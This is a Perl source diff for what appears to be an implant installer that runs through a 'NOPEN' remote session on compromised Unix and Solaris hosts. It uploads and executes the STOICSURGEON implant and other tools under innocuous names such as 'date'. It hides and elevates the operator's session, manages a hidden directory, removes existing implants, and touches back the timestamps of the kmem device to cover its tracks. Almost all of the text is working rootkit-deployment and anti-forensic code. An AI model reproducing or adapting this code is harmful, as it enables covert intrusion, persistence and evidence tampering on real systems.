+      if ($installtype eq "remove");
+    $stoicinstall++ if $tools[$i] =~ /stoicsurgeon/i;
+    my $others = " @tools";
+    $others =~ s/ $tools[$i]//;
+    my $toolcomment = "";
+    $toolcomment = " $comments[$i]"
+      if (length $comments[$i]);
+    if ($tools[$i] =~ /straitbizarre/i and $sbguid) {
+	my $tmpsbguid = $toolcomment;
+	$tmpsbguid =~ s,-,,g;
+	($tmpsbguid) = $tmpsbguid =~ /([a-f0-9]{32})/;
+	$toolcomment .= "guid $sbguid" unless ($sbguid eq $tmpsbguid);
+    }
+    if ($zfssnapshot) {
+	$zfssnapshot =~ s,([\r\n]),$1Tool Comments: ,g ;
+	$toolcomment .= " ZFS snapshot exists:\nTool Comments: $zfssnapshot";
+    }
+
+    my ($content,$warning) = logtool(
+	 "$tools[$i]",
+	 "$versions[$i]",
+	 "$success",
+         "$what1",
+	 "$toolcomment $what2 with$others $errstring",
+	);
+    $allcontent .= $content;
+    $allwarning .= $warning;
+  }
+  progprint($COLOR_FAILURE.
+	    "Finished.\n$progress\n$COLOR_NOTE\n".
+	    "$prog just added these entries to\n".
+	    "$hostfile:\n\n$COLOR_NORMAL".$allcontent.
+	    "\n".$allwarning
+	   );
+
+  ($output,$nopenlines,@output)
+    = doit("-ls $workdir/$remotename") unless $logonly;
+  if ($output and $success =~ /^successful/i) {
+    my ($ans) = offerabort
+      ("$COLOR_NORMAL\nPROPOSED HOSTINFO CONTENT:\n".
+       $newhostinfocontent."\n\n".
+       "$COLOR_FAILURE $output\n".
+       "$COLOR_NORMAL\n".
+       "The $remotename file still exists. This usually indicates failure,\n".
+       "but the output ending in :00 seemed to indicate success.\n\n".
+       "You can abort here and nothing will be logged to\n".
+       "   $hostfile.\n".
+       "Or choose another option, which will log there:\n".
+       "  1) Change all statuses to \"Failed\"\n".
+       "  C) Log it as successful anyway (really?)\n\n".
+       "Choose one, or",
+       "1","2"
+      );
+    if ($ans eq "1") {
+      $newhostinfocontent =~ s/success\S+/FAILED/ig;
+    }
+  }
+  unless ($logonly) {
+    if ($stoicinstall) {
+      my ($elevatesuccess,$prompt,$more)=();
+      if ($success =~ /^successful/i) {
+	my $solarismore = "";
+	if ($solaristarget and $host_touchkmem) {
+	  my ($output) = doit("-ls -n /devices/pseudo/mm\@0:kmem");
+	  $output =~ s,\s+, ,g;
+	  my ($touchedback) = doit("$host_touchkmem /devices/pseudo/mm\@0:kmem")
+	    unless ($output =~ /^$host_touchkmem/);
+	  $solarismore = ", and the times for\n".
+	    "/devices/pseudo/mm\@0:kmem have been manually touched back"
+	      if ($touchedback);
+	}
+	if ($skipctrl) {
+	  mygetinput
+	    ("Install appears successful$solarismore!  Its output was:\n\n".
+	     "   $installoutput\n\n".
+	     "You chose to SKIP all use of Ctrl, so this window has$COLOR_FAILURE NO WAY$COLOR_NORMAL\n".
+	     "to elevate. If you trigger on in another window, it will be elevated. You should$COLOR_FAILURE\n".
+	     "BE VERY CAREFUL$COLOR_NORMAL in this and any unelevated windows to NOT access the hidden\n".
+	     "directory. If you do, STOIC will self-destruct.\n\n".
+	     "Press Enter to continue."
+		    );
+	} else {
+
+	  # On success, we set this new $ctrlfile as the right one for
+	  # this box for remainder of op.
+	  mystoicctrl(noprompt,$ctrlfile);
+	  ($hiddendir,$safehiddendir,@output) = gethiddendir(force);
+	  $elevatesuccess=0;
+	    mygetinput("\n$COLOR_FAILURE\n".
+		       "Install appears successful$solarismore! Its output was:\n$COLOR_NORMAL\n".
+		       "   $installoutput\n\n".
+		       "This window remains unpriveleged. Compare this window to the one you\n ".
+		       "get from a fresh trigger test with commands like:\n\n".
+		       "    =ps\n".
+		       "    =nsg ESTAB\n".
+		       "    -ctrl -LR\n".
+		       "\nHit Enter to continue...");
+	}
+	my $moresuccess="";
+	if ($elevatesuccess > 0) {
+	  $moresuccess = "\n$COLOR_SUCCESS\nSUCCESS!$COLOR_NORMAL\nSUCCESS!\n\n".
+	    "You (and parent, if any) should be fully priveleged/hidden.";
+	}
+#	dbg("success=$success=");
+      }
+      if ($success eq "FAILED") {
+	$output = "$COLOR_WARNING\nFAILED!$COLOR_FAILURE\nFAILED!$COLOR_WARNING\n".
+	  "FAILED!$COLOR_FAILURE\nFAILED!\n\n".
+	  "Install FAILED:\n".
+	  $installedtools;
+      } else {
+	$output = "$moresuccess\n$COLOR_SUCCESS\nSUCCESS!$COLOR_NORMAL\nSUCCESS!\n\n".
+	  "Install complete:\n".
+	  $installedtools;
+      }
+    }
+  } else {
+    my $which = "most recent install";
+    $which = "contents of this tarball" if $logfailureball or $logsuccessball;
+    $output = "Logged $which ($installdir) as: $success";
+  }
+#  progprint($output);
+  rmctrl(force) unless $skipctrl;
+  return $output;
+}#end sub handle
+
+sub mymydie {
+  rmctrl(force) unless $skipctrl;
+  mydie(@_);
+}
+
+
+sub myinit {
+  $willautoport=1;
+  my $autoutils = "../etc/autoutils" ;
+  unless (-e $autoutils) {
+    $autoutils = "/current/etc/autoutils" ;
+   }
+  require $autoutils;
+
+
+  ($installtype) = $0 =~ /auto(\S+)/;
+
+  $prog = "-gs $installtype";
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  $linuxtarget = $nopen_serverinfo =~ /linux/i
+    unless $linuxtarget;
+
+  ($solaristarget,$junk,$solaristargetversion)
+    = $nopen_serverinfo =~ /((sunos|solaris)\s*([\d\.]*))/i;
+  # Use the 2.* nomenclature for solaris, to match
+  # what our tarball VERSION files use.
+  $solaristargetversion =~ s/^5/2/g;
+
+  $inteltarget = $nopen_serverinfo =~ /[i3456x]+86/;
+
+  ($sparctarget) = $nopen_serverinfo =~ /((sparc|sun4[umc])\S*)/;
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"$prog\" or
+\"=install\" is used.
+
+";
+  {  $gsusagetext=<<EOFUSAGE ;
+Usage: $prog [-s WHAT | tarball]
+
+$prog installs one or more tools, logging that fact and its success
+or failure in $opetc/hostinfo.HOSTNAME.IPADDRESS.
+
+$prog currently understands the following tools\' formats, and for
+these will nicely have mostly default answers for you that are correct:
+
+      STOICSURGEON with other tools packaged together
+
+NOTE: Stoicsurgeon-Ctrl will be used for all STOIC related queries on target,
+      though the shorthand \"-ctrl\" will be used to reference its use.
+
+
+OPTIONS
+  -h/-v      Show usage/version
+  -b         Pause after uploading installer (date) and Ctrl (e.g.,
+             to bless them in another window)
+#####  -B         Install standalone -sWHAT backgrounded with an \"\&\"
+  -C         Skip all use of Stoicsurgeon-Ctrl. This means you will
+             not be told if the box is already implanted.
+  -L         Log last install as successful
+  -l         Log last install as a failure
+  -P         Use PATH=.:\$PATH instead of PATH=. to do the install
+  -p         Preface the \"date\" command with something--you are prompted right
+             before it is executed for that string. You can run another command
+             or set a variable. You must ensure it is proper syntax, including
+             any semicolons. E.g., you could enter any of:
+                         ulimit -n 1024;
+                         ulimit -n 1024 &&
+                         TZ=GMT
+			 export TZ=GMT ; 
+                         SOMEVAR=\"Some content\"
+  -r NAME    Upload/execute as \"name\" instead of the default.
+             The -r defaults to date for stoicsurgeon, but -r is
+             required in -s/standalone mode.
+#####  -sWHAT     STANDALONE: Install something in standalone mode. The
+#####             optional WHAT argument can be just a tool name or a full
+#####             path to the local tool to install. (see STANDALONE MODE above)
+  -s LIST    If the token provided is the word \"LIST\", $prog will simply
+             list all files in $opup (recursively) that match this platform.
+             ${COLOR_FAILURE}NOTE$COLOR_NORMAL: This list may include things
+             not usable by $prog -s, proceed if you know what you are doing.
+  -S SEED    SEED value to use when uploading Ctrl (default is for
+             $prog to calculate this, which works fine usually).
+  -T         Log successful install from tarball contents
+  -t         Log unsuccessful install from tarball contents
+  -U         Only DEINSTALL existing implants, do NO install
+             (tarball is optional with -U)
+  -w DIR     Use this as your working directory
+
+      NOTE:  Use -l or -L if the PATH=. date line hangs and you have to
+             kill that NOPEN window (and $prog) to get it back
+
+Usage: $prog [options] [tarball] [NAME1=VALUE1 [NAME..=VALUE..]]
+
+EOFUSAGE
+   }
+
+if ($installtype ne "install") {
+    $gsusagetext = <<EOF;
+Usage: $prog -t|-T [tarball]
+
+$prog is strictly for local tool logging purposes. It logs either a
+successful or unsuccessful $installtype based on the tarball provided on the command
+line. The tarball need only contain an ./etc/VERSION file in this format to
+allow such logging (other content is unpacked but ignored):
+
+              TOOLNAME   platformstring  v#.#.#.#
+
+If the \"platformstring\" does not match what autoinstall thinks it should be
+on your target, it warns you but allows you to override and still log it
+(and so that string can be meaningless).
+
+OPTIONS (other options may be accepted, but will be ignored in $installtype mode)
+  -h/-v      Show usage/version
+  -T         Log successful install from tarball contents
+  -t         Log unsuccessful install from tarball contents
+
+Usage: $prog -t|-T [tarball]
+
+EOF
+  }
+
+  my $notused = "  -P        Use PATH=. (default is to set the path to PATH=DIR:$PATH)
+";
+#dbg("tarball=$tarball ARGV=(@ARGV)");
+  $tarball=pop @ARGV if (-f $ARGV[$#ARGV]);
+  mydie("bad option(s), try without a space after the -s") if (! Getopts( "hvdUS:Llr:w:TtbCPs:Bp" ) ) ;
+  # Unknown why but "-UC TARBALL" leads to empty @ARGV so used pop above to get it
+  $tarball=shift @ARGV if (-f $ARGV[0]);
+#dbg("tarball=$tarball ARGV=(@ARGV)");
+  $deinstallonly = $opt_U;
+  $extracmd = $opt_p;
+  $dotpath = $opt_P;
+#  $dotpath = 1 ; # FORCE THIS FROM NOW ON INSTALLS SEEN TO FAIL NOT IN ./
+  $dopause = defined $opt_b ? "-b" : "" ; # b for bless
+  $skipctrl = $opt_C;
+  $remotename = $opt_r;
+  $seed = lc $opt_S;
+  $workdir = "/tmp";
+  $workdir = $opt_w if length $opt_w;
+  $workdir = $host_nonhiddenworkingdir unless $workdir;
+  $debug = $opt_d ;
+  $logsuccess = $opt_L;
+  $logfailure = $opt_l;
+  $logsuccessball = $opt_T;
+  $logfailureball = $opt_t;
+  $tmpfilext = "$$";
+  usage() if ($opt_h or $opt_v) ;
+
+  mydie("-r $remotename cannot contain any /")
+    if ($remotename =~ m,/,);
+  mydie("-w $workdir must begin with a /")
+    unless $workdir =~ m,^/,;
+  mydie("-w $workdir cannot contain whitespace")
+    if $workdir =~ m,\s,;
+  $workdiropt = "w$workdir" if $workdir;
+
+  mydie("-w $workdir: Cannot use STOIC hidden directory")
+    if ($host_hiddendir and $workdir =~ $host_hiddendir);
+
+  if ($host_workingdir and $host_workingdir ne $workdir) {
+    progprint("RESETTING host-wide variable host_workingdir from:\n".
+	      "  $host_workingdir to $workdir",
+	      $COLOR_FAILURE);
+  }
+
+  # Remember this dir for future use
+  newhostvar("host_workingdir",$workdir);
+
+  # The unless $socket should never be needed here, this is a standalone script.
+  $socket = pilotstart(quiet) unless $socket;
+
+  # installthis does not return
+  installthis($opt_s) if ($opt_s);
+
+  # Proceed with tarball install
+  mydie("You cannot use -l or -L with a tarball")
+    if ($tarball and ($logsuccess or $logfailure));
+  mydie("You must use -t or -T with a tarball")
+    if (!$tarball and ($logsuccessball or $logfailureball));
+  $logonly = ($logsuccess or $logfailure or $logsuccessball or $logfailureball);
+
+  if ($installtype ne "install" and !($logsuccessball or $logfailureball)) {
+    mydie("-gs (use|exercise|remove|access) can only be used in\n".
+          "logging only mode WITH a tarball (-T/t)");
+  }
+
+
+  mydie("-S $seed not must be a 32 character hex value")
+    unless (!$seed or $seed =~ /^[a-f0-9]{32}$/i);
+  $seedopt = "";
+  $seedopt = "-S$seed" if $seed;
+
+} #myinit
+
+sub installthis {
+  local ($installthis) = (@_);
+  $installthis =~ s,^\.\./+up/+,$opup/,
+    if ($installthis =~ m,^\.\./+up/+, and -f "$opup/$installthis");
+  $backgrounded = " &" if $opt_B;
+   my ($installpath,$installcmd,$putcmd,@installcmds) = (".");
+  $installpath .= ":\$PATH" if $dotpath;
+  mydie("-r remotename is required in standalone/-s mode")
+    unless ($remotename);
+    
+  if ($installthis eq "LIST" or (-f $installthis and -s _)) {
+    my @list = ();
+    my $str = "*$installthis*";
+    $str = "*" if ($installthis eq "LIST");
+    @list = parelist(split(/\n/,`cd $opup ; find ../up/*/ -name "$str" -type f`));
+    progprint("$COLOR_NORMAL\n\n".
+	      "The following files in ../up$COLOR_FAILURE MAY$COLOR_NORMAL be installable with $prog -s:\n\n  ".
+	      join("\n  ",@list).
+	      "\n\nThe above files in ../up$COLOR_FAILURE MAY$COLOR_NORMAL be installable with $prog -s."
+	     );
+    mydie() if ($str eq "*");
+  }
+  mydie("-s $installthis must exist and be non-empty")
+    unless (-f $installthis and -s _);;
+  my $dirname = dirname($installthis);
+  my $filename = basename($installthis);
+  my $filesize = -s $installthis;
+  $installcmd = "cd $workdir ; PATH=$installpath $remotename$backgrounded";
+  my ($output) = doit("-ls $workdir/$remotename");
+  if ($output) {
+    offerabort("If you continue, the file listed above will be OVERWRITTEN.");
+  }
+  $putcmd = "-put $installthis $workdir/$remotename";
+  @installcmds = ("$putcmd",
+		  "$installcmd ; echo RETURNED:$?",
+		  "-rm ".dotdotpathforfile($remotename,$workdir)
+		 );
+  offerabort("$prog:$COLOR_NORMAL\n\nINSTALLING $installthis:\n\n".
+	     #"cd $dirname ; ls -al $filename\n".
+	     `cd $dirname ; ls -al $filename`."\n".
+	     "sha1sum: ".`cd $dirname ; sha1sum $filename`.
+	     "md5sum:  ".`cd $dirname ; md5sum $filename`."\n\n".
+	     "in $workdir as $remotename with:\n\n   ".
+	     join("\n   ",@installcmds).
+	     ""
+	    );
+  my ($output) = doit(shift @installcmds);
+  mydie("ABORTING: You failed to force the overwrite by answering \"YES\"")
+    if ($output =~ /-put: aborted\n$/);
+  mydie("Unexpected output, does not end in a listing of $workdir/$remotename")
+    unless ($output =~ m,rwx.* $workdir/$remotename,);
+  mydie("Uploaded file is not $filesize bytes")
+    unless ($output =~ m,rwx.* $filesize .* $workdir/$remotename,);
+
+
+  doit(@installcmds);
+
+
+# T
+#O
+#D
+#O
+#: ADd logging
+#  
+  exit;
+}
+
+sub myfiletimesave {
+  # Use -ls -n to save m/atimes of a this hosts kmem file (just once per op tho,
+  # use previous result from global $host_touchkmem).
+  # Unable to use the filetimesave() in utils, @ is messy.
+  # That can be used later from the global $host_touchkmem to set
+  # the times back.
+  # NOTE: TO save times for a file containing an @ symbol, use ? instead,
+  #       EVEN when calling filetimesave().
+  # RETURNS: array of touch lines for files just sent.
+  return () unless ($socket);
+  local($savetimefile) = (@_);
+  my ($result,@results) = ();
+  unless ($host_touchkmem) {
+    ($result) = doit("-ls -n $savetimefile");
+    chomp($result);
+    my ($mtime,$atime) = $result =~ /-touch -t (\d+):(\d+)\s+$savetimefile/;
+    next unless ($mtime and $atime);
+    $result =~ s,\@,\\@,g;
+    newhostvar("host_touchkmem","-touch -t $mtime:$atime");
+  }
+  push(@results,$host_touchkmem)
+    if ($host_touchkmem);
+  return @results;
+}
